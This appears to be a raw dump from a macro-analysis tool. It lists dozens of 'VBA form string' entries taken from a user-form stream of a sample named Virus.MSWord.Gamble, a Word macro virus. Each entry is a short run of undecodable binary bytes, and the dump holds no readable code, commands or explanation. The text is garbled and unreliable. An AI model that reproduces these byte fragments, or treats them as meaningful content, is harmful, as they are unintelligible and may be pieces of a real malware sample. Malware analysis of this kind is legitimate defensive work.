- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K��ٳhӪ]˶�۷p�ʝK��ݻx���˷�߿�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
L��U^[̸1c��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'��0���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/G�<Y�g͙?c��W��͐O[&mW5苮
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��뙖m۫C������ߎQ��M��o��Y�&���q��_:��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���cF�=����أ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=�w���/��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9��Fӫ�;�|���ʟ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������D�s�}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2� -
.H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ա�%�(��#R�a|,:X����8�&ڈ��4֨�8"��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�(R�-~�Ԑ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
idGH�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
dR'f��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U)%�Pi	d�Xb��\F5�aft&�V1)#�iF�&�W�Ig�r�yg�z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'�
͉�V}��$�	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j�U)J"�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�^W�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i����(�״�ߥ�u�z�e:%��j
V���Y)�����g���X&���
+��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:V��"
,��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z��e-;k��>Z���B�,��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����j����z���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F�m�ߞk��閇ֵ��g.�f]�����U��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�o�����4����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,n������g/�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�n��M�0�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ڱ� �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'+��(��Ҍ7ӌ��+C�2���|�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�r#�Lq�D��DA7)�GN�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�h1�z�FY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���S#T[�[z&f�R{}6ܞ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�~l��De��]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�v��w��}M��r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ӕ�=x̅7�u�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��a�?�v�Z�d�-�p�?��A��.X�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�^����ꁱ޹��C~���f;�Q�.����n�_��9���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�b�#���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���{

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}u�3�=�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ߺ=s��;�y�y���OO��ߣ_����]���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ӏ������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��	p�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Ol
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�^�Bu�	�L�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RPx��K��v�
Z�J��L�>�@�Iτ�ӟ�^�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}��-��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1�6�!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�e�$� ��v
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�W&&11g�S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$&q U��J�#>/r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/^�"�,&4�L��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����ab
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�y\
�M�x�E��.��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@NQw@�K$��%m�M��$'�#J9>�7i��)}RJ2�1,N�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<�����-��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K��2-�D�*y��Q�2\���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
aTLU��:���1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-�$�4mRMk>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��4�6g�Mo~�,�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�+}TK���Q���:IRNs
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�a��'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+��Nu>�J�d�"�XO{"Re�4h��9���q�Br(��Iς*t�Z�;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�u��2��P�~Ԙ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�FGJҎ�����T>a�Ö
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(DY�ғ�m����DwZ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
�j@U�P�JTj�t�T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f��˔��Tu�@]�U>��4�a��
S��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�e�h���S��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�]ueS�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�u���Y�U�JA�B3�%�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v�n4,��
ʦ)V��U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cM����v
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�qv|M�fq���r֯(��i�yZ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I����fM����(m���,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a�T����p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+ٸ�G�bR�}%nT���+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���K��8���'�#l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�K���r�I��)#48�V�R�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�V[�W��?���n��^�U��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\�u�I��jw������+ZD���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�'�;*ʹ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p�CZp�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
KN��<+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�(��W]�E-r�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��^����m*6+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���H���_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ؠ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R�����d!O��4�)����k��r3��o]ڵ]f����2��ed0�y���R�}ˬ&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U��,�aFK�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N�?�\�$�VB{�l�<�D����&t�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-;G�qьN&��,�I�Ъ�>��/X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�u�4����QW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ϝ��{�i%���;f�oq�b\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
yВ�oM�������~s{��ͨ�Z��M6�/<�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"�ق<��<�\O�ֳ�5��V�5KRڥ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^q�;��>�vU��oK
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�dn�"uvlR�{.�~����o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g�����<�v�SI8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W���=�_u�y��o|qeW��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Y������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
xw�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�O�q���5'y̟[_�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]惢y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��{崶��g��]��s%6�3�랻��U�2�}&�D�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����ʥne6���-4
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�������F�yuYҹ�]�~8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����r�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��*w����@�ّ��h=�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�~��%�p��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{��b�c��2�����/v��.�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
׼�YV
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��=?��{�����2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�zic���|kk_u����op�gz�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����t��[o����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K���:�iܻ��9W>Aï�����v��-����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�N}��/m����7I�wU�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�t�d|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"~�Wn��}�n�[l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��6��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}�w��Gw#�}qC���o�']�W�Q�z��k�um����&~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
YH3Wq�����9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ȁ��a�dR
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�nBH�Dxs
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
HwT4�OX]W�h1�{Sx������ah��\8օ���b�mk�`dh��'���j��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GI=�C�unN��yxaQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
